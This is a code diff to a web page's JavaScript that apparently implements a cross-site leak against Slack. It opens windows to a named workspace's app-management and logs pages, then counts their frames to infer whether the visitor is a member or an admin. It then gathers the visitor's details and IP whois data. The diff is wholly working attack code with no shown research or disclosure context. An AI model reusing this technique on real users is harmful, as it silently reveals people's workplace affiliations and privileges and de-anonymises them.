@@ -71,28 +71,42 @@ window.blocked = false;
                     getwhois(window.dataip);
                 });
             }
+
+            var checkAdmin = (teamname, win) => {
+                if(win.frames.length == 1){
+                    result.innerHTML += "[+] You are the admin of "+teamname+", below are your details";
+                    getUserInfo();
+                            
+                }else{
+                    result.innerHTML += "[+] You are not an admin but you are member of "+ teamname+", below are your details";
+                    getUserInfo();
+                    clear();
+                }
+            }
+
             function checkOwner(){
                 var result = document.getElementById("result");
                 var teamname = document.getElementById("do").value;
                 var windowHeight = window.innerHeight;
 
-                
+                if(win2 == null)
+                    var win2 = window.open()
                 if(win == null)
                     var win = window.open();
-                
+                    
+                win2.location = "https://"+teamname+".slack.com/apps/manage/"
                 win.location = "https://"+teamname+".slack.com/apps/manage/logs"
 
                 setTimeout(() => {
-                    
-                        //below condition one is for download bar chrome
-                        if(win.frames.length == 1){
-                            result.innerHTML = "[+] You are the admin of "+teamname+", below are your details";
-                            getUserInfo();
+                    if(win2.frames.length == 1){
+                            result.innerHTML = "[+] You are the member of "+teamname+", let's check if you are an admin or not<br />";
+                            checkAdmin(teamname, win)
                             
-                        }else{
-                            result.innerHTML = "[+] Nothing found";
-                            clear();
-                        }
+                    }else{
+                        result.innerHTML = "[+] Nothing found";
+                        clear();
+                    }
+                        
                     
                 }, 10000);
                 
